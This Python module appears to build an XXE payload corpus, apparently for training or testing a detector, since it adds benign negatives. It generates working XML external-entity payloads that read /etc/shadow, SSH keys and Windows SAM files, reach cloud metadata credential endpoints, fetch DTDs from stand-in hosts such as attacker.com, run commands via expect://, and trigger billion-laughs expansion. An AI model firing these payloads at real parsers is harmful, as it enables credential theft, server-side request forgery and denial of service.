"""Load and normalize raw XXE payload corpora."""
from __future__ import annotations

import itertools
from pathlib import Path


def normalize_payload(line: str) -> str:
    """Strip whitespace, drop blank lines and pure comments."""
    s = line.strip()
    if not s:
        return ""
    if s.startswith("#"):
        return ""
    return s


def load_payloads_from_file(path: Path) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out


def load_payloads_from_dir(root: Path) -> list[str]:
    """Recursively load all .txt payloads under root, deduped, order preserved."""
    root = Path(root)
    seen: set[str] = set()
    out: list[str] = []
    files = sorted(root.rglob("*.txt")) if root.is_dir() else []
    for f in files:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


# ---------------------------------------------------------------------------
# Built-in payload generators
# ---------------------------------------------------------------------------

# File read targets (Linux)
_LINUX_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group", "/etc/issue",
    "/etc/hostname", "/etc/crontab", "/etc/fstab", "/etc/resolv.conf",
    "/etc/ssh/sshd_config", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf",
    "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status",
    "/proc/version", "/proc/cpuinfo", "/proc/meminfo",
    "/root/.bash_history", "/root/.ssh/id_rsa", "/root/.ssh/id_dsa",
    "/var/log/auth.log", "/var/log/messages", "/var/log/syslog",
    "/var/www/html/config.php", "/var/www/html/.env",
    "/home/user/.ssh/id_rsa", "/home/user/.bashrc",
    "/opt/app/secrets.txt", "/app/config/database.yml",
    "/tmp/secret", "/usr/local/etc/php.ini",
]

# File read targets (Windows)
_WIN_FILES = [
    "c:/windows/win.ini", "c:/windows/system32/drivers/etc/hosts",
    "c:/windows/repair/sam", "c:/windows/system32/config/SAM",
    "c:/windows/system32/config/SYSTEM", "c:/windows/debug/NetSetup.log",
    "c:/inetpub/wwwroot/web.config", "c:/xampp/apache/conf/httpd.conf",
    "c:/Users/Administrator/.ssh/id_rsa",
    "c:/windows/system.ini", "c:/windows/my.ini",
    "c:/ProgramData/application.json",
]

# HTTP/HTTPS targets for OOB and SSRF-via-XXE
_HTTP_TARGETS = [
    "http://attacker.com/evil", "http://evil.com/exfil",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    "http://attacker.com/collect",
    "http://evil.com/steal",
    "http://hacker.server/log",
    "http://internal.corp/api/keys",
    "http://127.0.0.1:8080/admin",
    "http://127.0.0.1:6379/",
]

_HTTPS_TARGETS = [
    "https://attacker.com/evil", "https://evil.com/exfil",
    "https://169.254.169.254/latest/meta-data/",
    "https://attacker.com/collect",
]

# PHP wrapper targets
_PHP_WRAPPERS = [
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/convert.base64-encode/resource=config.php',
    'php://filter/convert.base64-encode/resource=/etc/passwd',
    'php://filter/read=convert.base64-encode/resource=/var/www/html/index.php',
    'php://filter/convert.base64-encode/resource=wp-config.php',
    'expect://id', 'expect://whoami', 'expect://cat /etc/passwd',
]

# Gopher/other protocols
_OTHER_PROTO = [
    'gopher://127.0.0.1:25/', 'gopher://127.0.0.1:6379/_INFO',
    'ftp://127.0.0.1/', 'jar:http://attacker.com/evil.jar!/',
    'netdoc:///etc/passwd', 'netdoc://localhost/etc/passwd',
]

_ENTITY_NAMES = ["xxe", "x", "data", "file", "content", "secret", "exfil", "leak"]
_ROOT_ELEMENTS = ["foo", "root", "data", "test", "item", "user", "msg"]


def _gen_classic_file(targets: list[str], proto: str = "file://") -> list[str]:
    """Generate classic external-entity file-read payloads."""
    out = []
    for target, ent, root in itertools.product(targets, _ENTITY_NAMES, _ROOT_ELEMENTS):
        # With XML declaration
        out.append(f'<?xml version="1.0"?><!DOCTYPE {root} [<!ENTITY {ent} SYSTEM "{proto}{target}">]><{root}>&{ent};</{root}>')
        # Without XML declaration
        out.append(f'<!DOCTYPE {root} [<!ENTITY {ent} SYSTEM "{proto}{target}">]><{root}>&{ent};</{root}>')
    return out


def _gen_http(targets: list[str]) -> list[str]:
    """Generate external-entity HTTP-fetch payloads."""
    out = []
    for target, ent, root in itertools.product(targets, _ENTITY_NAMES, _ROOT_ELEMENTS):
        out.append(f'<!DOCTYPE {root} [<!ENTITY {ent} SYSTEM "{target}">]><{root}>&{ent};</{root}>')
    return out


def _gen_oob() -> list[str]:
    """Generate parameter-entity OOB payloads."""
    dtd_urls = [
        "http://attacker.com/evil.dtd", "http://evil.com/payload.dtd",
        "http://attacker.com/exfil.dtd", "http://hacker.server/dtd",
        "https://attacker.com/evil.dtd",
    ]
    out = []
    for url in dtd_urls:
        for root in _ROOT_ELEMENTS:
            out.append(f'<?xml version="1.0"?><!DOCTYPE {root} [<!ENTITY % dtd SYSTEM "{url}">%dtd;]><{root}>test</{root}>')
            out.append(f'<!DOCTYPE {root} [<!ENTITY % dtd SYSTEM "{url}">%dtd;]>')
    # With file read + external DTD
    for url in dtd_urls[:3]:
        for f in ["/etc/passwd", "/etc/shadow", "c:/windows/win.ini"]:
            out.append(f'<!DOCTYPE foo [<!ENTITY % file SYSTEM "file://{f}"><!ENTITY % dtd SYSTEM "{url}">%dtd;]>')
    return out


def _gen_billion_laughs() -> list[str]:
    """Generate billion-laughs / exponential expansion payloads."""
    return [
        '<!DOCTYPE foo [<!ENTITY billion "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY a "&billion;&billion;">]><foo>&billion;</foo>',
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        '<?xml version="1.0"?><!DOCTYPE boom [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;">]><boom>&c;</boom>',
        '<!DOCTYPE test [<!ENTITY x "xx"><!ENTITY xx "&x;&x;&x;&x;&x;"><!ENTITY xxx "&xx;&xx;&xx;&xx;">]><test>&xxx;</test>',
        '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY l "AAAAAAAAAA"><!ENTITY l2 "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY l3 "&l2;&l2;&l2;&l2;&l2;">]><data>&l3;</data>',
    ]


def _gen_svg() -> list[str]:
    """Generate SVG-based XXE payloads."""
    targets = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "c:/windows/win.ini"]
    out = []
    for target in targets:
        for ent in ["xxe", "data", "content"]:
            out.append(f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY {ent} SYSTEM "file://{target}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&{ent};</text></svg>')
            out.append(f'<!DOCTYPE svg [<!ENTITY {ent} SYSTEM "file://{target}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&{ent};</text></svg>')
    # SVG with HTTP target
    for url in ["http://attacker.com/evil", "http://169.254.169.254/latest/meta-data/"]:
        out.append(f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{url}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')
    return out


def _gen_soap() -> list[str]:
    """Generate SOAP-based XXE payloads."""
    targets = ["/etc/passwd", "/etc/shadow", "c:/windows/win.ini"]
    out = []
    for target in targets:
        for ent in ["xxe", "data", "content"]:
            out.append(f'<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY {ent} SYSTEM "file://{target}">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&{ent};</soap:Body></soap:Envelope>')
            out.append(f'<!DOCTYPE soap [<!ENTITY {ent} SYSTEM "file://{target}">]><soap:Envelope>&{ent};</soap:Envelope>')
    # SOAP with HTTP
    for url in ["http://attacker.com/evil", "http://169.254.169.254/latest/meta-data/"]:
        out.append(f'<!DOCTYPE soap [<!ENTITY xxe SYSTEM "{url}">]><soap:Envelope>&xxe;</soap:Envelope>')
    return out


def _gen_attribute() -> list[str]:
    """Generate attribute-based XXE payloads."""
    targets = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "c:/windows/win.ini"]
    out = []
    for target in targets:
        for ent in ["xxe", "data"]:
            out.append(f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY {ent} SYSTEM "file://{target}">]><foo name="&{ent};"/>')
            out.append(f'<!DOCTYPE foo [<!ENTITY {ent} SYSTEM "file://{target}">]><foo value="&{ent};"/>')
    return out


def _gen_cdata() -> list[str]:
    """Generate CDATA-wrapped XXE payloads."""
    targets = ["/etc/passwd", "/etc/shadow", "/etc/hosts"]
    out = []
    for target in targets:
        for ent in ["xxe", "data"]:
            out.append(f'<!DOCTYPE foo [<!ENTITY {ent} SYSTEM "file://{target}">]><foo><![CDATA[&{ent};]]></foo>')
    return out


def _gen_php() -> list[str]:
    """Generate PHP wrapper XXE payloads."""
    out = []
    for wrapper in _PHP_WRAPPERS:
        for root in _ROOT_ELEMENTS:
            out.append(f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{wrapper}">]><{root}>&xxe;</{root}>')
    return out


def _gen_other_proto() -> list[str]:
    """Generate other-protocol XXE payloads."""
    out = []
    for proto in _OTHER_PROTO:
        out.append(f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{proto}">]><foo>&xxe;</foo>')
    return out


def _build_builtin_payloads() -> list[str]:
    """Assemble all built-in payloads, deduped, order preserved."""
    all_payloads: list[str] = []

    # Classic file reads (Linux + Windows) — the bulk of the corpus
    all_payloads.extend(_gen_classic_file(_LINUX_FILES))
    all_payloads.extend(_gen_classic_file(_WIN_FILES))

    # HTTP/HTTPS external entities
    all_payloads.extend(_gen_http(_HTTP_TARGETS))
    all_payloads.extend(_gen_http(_HTTPS_TARGETS))

    # PHP wrappers
    all_payloads.extend(_gen_php())

    # Other protocols
    all_payloads.extend(_gen_other_proto())

    # OOB parameter entities
    all_payloads.extend(_gen_oob())

    # Billion laughs
    all_payloads.extend(_gen_billion_laughs())

    # SVG
    all_payloads.extend(_gen_svg())

    # SOAP
    all_payloads.extend(_gen_soap())

    # Attribute-based
    all_payloads.extend(_gen_attribute())

    # CDATA-wrapped
    all_payloads.extend(_gen_cdata())

    # Benign / negative examples (do NOT fire)
    all_payloads.extend([
        '<root><name>test</name></root>',
        '<data>hello world</data>',
        '<item value="123"/>',
        '<user><id>42</id></user>',
        '<config><debug>false</debug></config>',
    ])

    # Dedupe, preserve order
    seen: set[str] = set()
    out: list[str] = []
    for p in all_payloads:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


BUILTIN_PAYLOADS: list[str] = _build_builtin_payloads()


def load_all_corpora(raw_dir: Path) -> list[str]:
    """Load external corpora if available, plus built-in payloads, deduped."""
    raw_dir = Path(raw_dir)
    seen: set[str] = set()
    out: list[str] = []

    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for payload in load_payloads_from_dir(d):
                if payload not in seen:
                    seen.add(payload)
                    out.append(payload)

    for payload in BUILTIN_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)

    return out
